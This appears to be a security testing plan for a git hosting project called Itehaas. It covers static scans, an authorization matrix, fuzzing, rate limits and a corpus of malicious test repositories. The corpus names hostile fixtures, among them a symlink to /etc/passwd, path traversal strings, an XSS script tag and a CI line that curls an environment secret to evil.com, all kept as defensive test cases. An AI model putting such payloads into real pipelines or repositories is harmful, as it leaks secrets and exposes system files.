# Itehaas — Security Testing

**Version:** 2026-09-02

## 1. Test Types

| Type | Tool | Frequency | Gate |
|------|------|-----------|------|
| Static | `pnpm audit --prod`, `cargo clippy`, `grep spawn`, `semgrep` | per commit | fail on critical |
| AuthZ matrix | `vitest` `Alice/Bob/Charlie × public/private` | per PR | must pass |
| Parser fuzz | `cargo fuzz` + `phase*_tests.rs` | nightly | no panic |
| Malicious corpus | `vcs/tests/security_corpus.rs` (symlink/bomb) | per PR | checkout must not escape |
| E2E browser | Playwright `tests/e2e/security.spec.ts` | per PR | no XSS/CSRF |
| Container | `trivy image` + `docker compose config` lint | per release | no critical, no `5432:5432` |
| Secrets | `gitleaks detect` + `git log --patch` grep | per PR | no token |

## 2. Corpus (`tests/security/repositories/`)

- `symlink-escape/` — tree with `evil → /etc/passwd` via working-tree symlink before checkout
- `path-traversal/` — `file/*` with `../../etc/passwd`
- `bomb-64m/` — 1M compressed → 64M+ decompressed
- `malformed-blob/` — header len mismatch, missing `\0`, invalid mode
- `malformed-commit/` — out-of-order fields, duplicate parents, invalid tz
- `deep-tree/` — nesting 500 dirs
- `deep-history/` — 5000 commit chain
- `xss-readme/` — `<script>alert(1)</script>`, `javascript:` links, SVG
- `ci-workflow-evil/` — `run: env; curl http://evil.com?k=$SECRET`

Each has `expect` script: server must reject or contain.

## 3. AuthZ Matrix (example)

| User | Repo | GET /branches | POST /issues | POST /members | DELETE /repos | POST /ci/run |
|------|------|---------------|--------------|---------------|---------------|--------------|
| anon | public | 200 | 401 | 401 | 401 | 401 |
| anon | private | 404 | 404 | 404 | 404 | 404 |
|alice(owner)| private |200|200|200|200|200|
|bob(read)| private|200|403|403|403|403|
|bob(write)| private|200|200|403|403|200|
|charlie(none)| private|404|404|404|404|404|

Automate via `buildApp().inject` with 3 users + 4 repos.

## 4. Rate Limit Test

- `POST /login` 6/min → 429, `GET /search` 31/min → 429.

## 5. Checklist per SEC

- SEC-001: `NODE_ENV=production` without `COOKIE_SECRET` → exit 1
- SEC-008: docker disabled → pipeline not sh
- SEC-013: symlink repo checkout → `fs.existsSync('/etc/pwned')` false

## 6. CI Gate

```yaml
- run: pnpm audit --prod --audit-level=critical
- run: cargo clippy -- -D warnings
- run: pnpm test -- coverage
- run: cargo test
- run: gitleaks detect --no-git -v .
```

